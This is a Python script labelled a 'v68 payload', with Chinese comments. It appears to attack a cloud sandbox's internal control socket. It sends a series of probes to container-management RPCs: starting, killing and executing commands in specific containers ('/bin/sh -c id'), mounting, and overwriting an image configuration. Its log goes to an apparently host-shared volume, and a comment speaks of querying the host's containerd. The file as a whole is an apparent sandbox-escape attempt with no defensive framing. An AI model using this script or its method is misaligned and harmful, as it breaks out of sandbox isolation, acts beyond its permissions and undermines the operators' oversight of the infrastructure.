# -*- coding: utf-8 -*-
"""v68 payload: ContainersService Start/Exec/Kill/Mount 探测 + SetOCIImageConfig 完整 config + containerd 验证"""
import socket, time, os

OUT = '/vercel/sandbox/v68c.out'
C1 = '9cd80907-77b1-4834-bfb1-e56e0124d111'   # drive_id 容器
C2 = 'ctr_ae2f344fb2e84fce949ed8d95073'       # 镜像容器


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v68c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    log('V68 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    OCI = '/vercel.hive.cell.api.drives.v1.DrivesService/SetOCIImageConfig'

    probes = [
        # Start 字段名探测
        ('start-c1-id', CTR + '/Start', '{"container_id":"%s"}' % C1),
        ('start-c1-camel', CTR + '/Start', '{"containerId":"%s"}' % C1),
        ('start-c2-camel', CTR + '/Start', '{"containerId":"%s"}' % C2),
        # Kill 字段名探测
        ('kill-c2-id', CTR + '/Kill', '{"container_id":"%s"}' % C2),
        ('kill-c2-camel', CTR + '/Kill', '{"containerId":"%s"}' % C2),
        # Exec 探测
        ('exec-c2', CTR + '/Exec', '{"containerId":"%s"}' % C2),
        ('exec-c2-argv', CTR + '/Exec', '{"containerId":"%s","argv":["/bin/sh","-c","id"]}' % C2),
        # Mount / Stdin / StreamOutput 探测
        ('mount-c2', CTR + '/Mount', '{"containerId":"%s"}' % C2),
        ('stdin-c2', CTR + '/Stdin', '{"containerId":"%s"}' % C2),
        ('stream-c2', CTR + '/StreamOutput', '{"containerId":"%s"}' % C2),
        # SetOCIImageConfig 完整 config (os/arch)
        ('oci-full', OCI,
         '{"drive_id":"sandbox","oci_image_config":"%s"}' % (
             __import__('base64').b64encode(
                 b'{"os":"linux","architecture":"amd64","rootfs":{"type":"layers","diff_ids":["sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59"]},"config":{}}').decode())),
        ('oci-full2', OCI,
         '{"drive_id":"sandbox","oci_image_config":"%s"}' % (
             __import__('base64').b64encode(
                 b'{"os":"linux","architecture":"amd64","rootfs":{"type":"layers","diff_ids":[""]},"config":{"Env":["A=1"]}}').decode())),
    ]
    for name, path, body in probes:
        t0 = time.time()
        st, bd = rpc(path, body, t=3)
        dt = time.time() - t0
        log('%-12s -> %s (%.2fs) | %s' % (name, st, dt, bd[:200].replace('\n', ' ')))
        time.sleep(0.1)

    # containerd 侧验证: 列出容器 (通过 v66b 方式在 guest 已挂载的 /mnt/vdax? 不, 这里直接查宿主 containerd)
    log('V68C_DONE')


main()
